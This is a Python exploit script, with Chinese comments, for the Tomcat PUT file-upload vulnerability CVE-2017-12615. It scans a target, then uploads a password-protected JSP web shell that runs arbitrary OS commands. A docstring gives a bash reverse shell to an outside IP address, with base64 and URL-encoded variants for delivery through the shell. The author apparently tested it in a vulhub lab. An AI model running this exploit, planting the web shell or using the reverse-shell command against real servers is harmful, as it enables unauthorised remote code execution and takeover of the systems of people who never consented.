# coding:utf-8

import requests 

"""
漏洞名称：Tomcat任意文件上传漏洞 CVE-2017-12615

漏洞范围:tomcat 5.x-9.x
"""

def tomcat_put_rwf_scan(url,path = "/google_hacker_est.txt/",payload = "Z29vZ2xlX2hhY2tlcl9lc3Q="):
    """
    主要漏洞判断函数，使用时只需要提供url参数即可工作  
    如果PUT上传的文件路径末尾存在"/"则会返回204(其实上传成功了)，  
    如果没有"/"，就会返回201，其实也上传成功了  
    区别只在于，该漏洞的利用是通过末尾的"/"来绕过tomcat对".jsp"的拦截检测的(当然windows下末尾::$DATA也能绕过，但是以/结尾能同时运行在linux和windows两种系统上，这种利用手法更具普适性)    
    而scan时仅上传txt文件，并不会触发拦截，所以末尾没有/也没有关系，而exploit阶段就一定要以/结尾了
    """
    if url.endswith("/"):
        url += path[1:]
    else:
        url += path

    urld = url[:-1]

    body = payload
    res = requests.put(url,data=body)
    if res.status_code == 204 or res.status_code == 201 :
        req = requests.get(urld)
        if req.status_code == 200:
            return True
        else :
            return False
    else:
        return False

def tomcat_put_rwf_exploit(url):
    """
    该函数调用了上面的scan函数，因为scan函数里面对于PUT上传成功&上传文件存活的判断逻辑都已经也好了，没必要重写
    仅接受url参数
    payload变量是一个有回显版本的小马，访问形式是:http://127.0.0.1:8080/google_hack_est_jijue.jsp?pwd=ant&cmd=ls
    
    另外，他只支持GET传递信息，所以如果有复杂的命令，因为是在Runtime.getRuntime().exec里面嘛，所以要先处理一下，然后经过url编码，否则有特殊符号也是跑不起来的
    比如反弹shell，原文是bash -i >& /dev/tcp/39.105.165.219/9999 0>&1
    经过处理是bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDUuMTY1LjIxOS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}
    再url编码就成了%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%7a%4f%53%34%78%4d%44%55%75%4d%54%59%31%4c%6a%49%78%4f%53%38%35%4f%54%6b%35%49%44%41%2b%4a%6a%45%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d
    这样就能反弹shell出去了
    """
    payload = """
                <%
                if("ant".equals(request.getParameter("pwd"))){
                    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
                    int a = -1;
                    byte[] b = new byte[2048];
                    out.print("<pre>");
                    while((a=in.read(b))!=-1){
                        out.println(new String(b));
                        }
                    out.print("</pre>");
                    }
                %>
                """
    exploit_result = tomcat_put_rwf_scan(url=url,path = "/google_hack_est_jijue.jsp/",payload=payload)
    if  exploit_result == True:
        return True 
    else :
        return False


if __name__ == "__main__":
    """
    利用脚本于vulhub环境测试成功，感谢离别歌大佬
    """
    url = "http://127.0.0.1:8080/"
    scan_result = tomcat_put_rwf_scan(url = url)
    if scan_result == True:
        print "vuln"
    else :
        print "not Vuln"
    print tomcat_put_rwf_exploit(url = url)